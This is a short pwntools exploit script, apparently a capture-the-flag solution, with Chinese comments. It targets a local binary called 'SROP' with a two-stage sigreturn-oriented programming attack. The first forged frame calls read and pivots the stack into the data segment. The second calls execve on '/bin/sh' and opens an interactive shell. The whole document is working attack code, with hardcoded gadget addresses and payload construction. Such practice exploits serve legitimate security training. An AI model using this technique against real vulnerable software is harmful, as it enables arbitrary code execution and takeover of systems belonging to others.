from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./SROP')

syscall     = 0x401127
mov_rax_15  = 0x401139
binsh       = 0x404000

# 调用SROP执行read函数, 并将rsp跳转到data段用于下一步SROP
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read
frame1.rip = syscall
frame1.rsp = binsh + 0x10
frame1.rdi = 0
frame1.rsi = binsh
frame1.rdx = 0x200

payload1  = b'a' * 0x10
payload1 += p64(mov_rax_15) + p64(syscall) + bytes(frame1)
p.send(payload1)
sleep(1) # 两次发送之间稍微停顿一下

# 第二段SROP调用execve
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rip = syscall
frame2.rsp = 0
frame2.rdi = binsh
frame2.rsi = 0
frame2.rdx = 0

payload2  = b'/bin/sh\x00'.ljust(0x10, b'a')
payload2 += p64(mov_rax_15) + p64(syscall) + bytes(frame2)

p.send(payload2)
p.interactive()
